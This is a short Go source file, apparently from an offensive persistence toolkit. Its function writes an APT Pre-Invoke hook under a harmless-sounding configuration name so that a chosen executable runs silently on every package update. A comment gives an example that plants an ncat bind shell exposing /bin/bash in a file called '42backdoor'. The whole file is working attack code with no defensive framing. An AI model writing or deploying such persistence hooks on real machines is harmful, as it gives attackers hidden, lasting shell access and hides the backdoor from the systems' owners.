package go_persistence

import (
	"fmt"
	"io/ioutil"
)

func Apt(exePath string) bool {
	/*
	*	Example:
	*	echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
	*/
	command := fmt.Sprintf(`APT::Update::Pre-Invoke {"%s 2> /dev/null &"};`, exePath)
	aptConfigPath := "/etc/apt/apt.conf.d/apt.driver.setup.conf"
	err := ioutil.WriteFile(aptConfigPath, []byte(command), 0644)

	return err == nil
}